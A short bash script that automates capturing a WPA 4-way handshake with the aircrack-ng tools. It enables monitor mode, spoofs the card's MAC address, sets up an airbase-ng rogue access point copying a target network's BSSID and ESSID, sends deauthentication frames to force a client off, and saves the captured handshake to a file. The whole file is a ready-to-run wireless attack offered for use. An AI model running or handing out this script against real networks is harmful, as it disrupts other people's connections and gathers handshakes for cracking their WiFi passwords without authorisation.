#!/bin/bash
#Creator: David Parra-Sandoval
#Date: 3/24/2020
#Last Modified Date: 3/29/2020
clear

if [[ ${UID} -ne 0 ]]; then
echo "Please run as root or sudo"
exit 1
else 
echo -e "\t\t\tWelcome $USER"
echo "-----------------------------------------------------------------"
echo "Capture 4 Way Handshake : without AccessPoint" 
echo "Thanks to: Crazy Danish Hacker"
echo "Youtube: https://www.youtube.com/watch?v=ENhLyPqmA5w"
fi

echo
echo "Checking for requirements......"
for app in aircrack-ng xterm macchanger; do
command -v $app 2>&1 > /dev/null
sleep 1
if [[ $? = 0 ]]; then
echo "$app installed..great!"
else  echo "$app not installed..NO!"
sudo apt-get install $app
fi
done

sleep 6

wifi=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sudo airmon-ng start $wifi
mon0=$(ip a | grep wl | head -1 | cut -d ":" -f 2)
sudo ip link set $mon0 down && sudo macchanger -A $mon0 && sudo ip link set $mon0 up
clear

exec xterm -hold -e sudo airodump-ng $mon0 & 
read -p "BSSID:" BSSID
read -p "ESSID:" ESSID
read -p "STATION:" STATION
read -p "HANDSHAKE:" HANDSHAKE
read -p "CH:" CH
exec xterm -hold -e sudo airbase-ng -a $BSSID -e $ESSID -c $CH -Z 2 $mon0 &
exec xterm -hold -e sudo airodump-ng --bssid $BSSID --essid $ESSID --channel $CH  --output-format pcap -w $HANDSHAKE $mon0 &
sleep 1
sudo aireplay-ng --deauth 6 -a $BSSID -c $STATION $mon0
clear

sleep 30
killall xterm
mv $HANDSHAKE*.cap $HOME/handshake

sudo airmon-ng stop $mon0
sudo ip link set $wifi down && sudo ip link set $wifi up
clear
